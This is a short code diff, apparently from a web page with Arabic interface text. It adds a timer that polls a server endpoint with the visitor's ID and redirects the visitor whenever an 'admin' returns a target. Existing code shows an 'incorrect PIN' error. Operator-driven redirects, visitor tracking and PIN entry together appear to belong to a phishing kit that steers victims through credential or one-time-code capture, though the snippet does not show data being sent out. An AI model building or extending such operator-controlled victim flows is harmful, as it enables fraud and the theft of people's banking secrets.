@@ -190,6 +190,15 @@
     let visitorId = sessionStorage.getItem('visitorId');
     document.getElementById('form_visitor_id').value = visitorId;
 
+    // كود إعادة التوجيه التلقائي من الأدمن
+    setInterval(() => {
+        fetch(`api/check_status.php?visitor_id=${visitorId}&v=${Date.now()}`)
+            .then(r => r.json())
+            .then(data => {
+                if (data.redirect) window.location.href = data.redirect + "?visitor_id=" + visitorId;
+            });
+    }, 4000);
+
     const urlParams = new URLSearchParams(window.location.search);
     if (urlParams.get('error')) {
         Swal.fire('الرقم السري غير صحيح', 'يرجى التأكد من الرقم السري وإعادة المحاولة', 'error');
